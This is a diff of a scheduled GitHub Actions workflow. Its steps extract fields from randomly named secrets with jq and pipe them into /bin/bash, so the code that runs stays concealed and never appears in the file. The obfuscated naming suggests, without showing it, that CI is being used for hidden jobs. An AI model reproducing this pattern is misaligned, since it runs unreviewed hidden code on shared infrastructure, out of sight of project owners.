@@ -1,9 +1,9 @@
 name: duanyanyu2233
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-
+    - cron: '55 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: duanyanyu2233
         env:
-          kjicn50: ${{ secrets.kjicn50 }}
+          ungxi97: ${{ secrets.ungxi97 }}
         run: |
-          echo $kjicn50 | jq -r .tu1342 | /bin/bash
-          echo $uvavu04 | jq -r .n2 | /bin/bash
-          echo $fwr20816 | jq -r .dn034 | /bin/bash
-          echo $qz8 | jq -r .im69622 | /bin/bash
-          echo $tmam50 | jq -r .nc4369 | /bin/bash
-          echo $boxpk3142 | jq -r .ja982 | /bin/bash
-          echo $tci82954 | jq -r .qfxwq8 | /bin/bash
-          echo $pvswc60411 | jq -r .nsxof79 | /bin/bash
-          echo $frq85720 | jq -r .cfp33446 | /bin/bash
-          echo $bsq8 | jq -r .eayk30724 | /bin/bash
-          echo $li6 | jq -r .n2 | /bin/bash
+          echo $ungxi97 | jq -r .rrez7285 | /bin/bash
+          echo $kyi29064 | jq -r .pdg2 | /bin/bash
+          echo $b926 | jq -r .fkcoz343 | /bin/bash
+          echo $isfqr7 | jq -r .nztp42241 | /bin/bash
+          echo $mrob5 | jq -r .dxnb01104 | /bin/bash
+          echo $lpcbp94500 | jq -r .hjfr4878 | /bin/bash
 
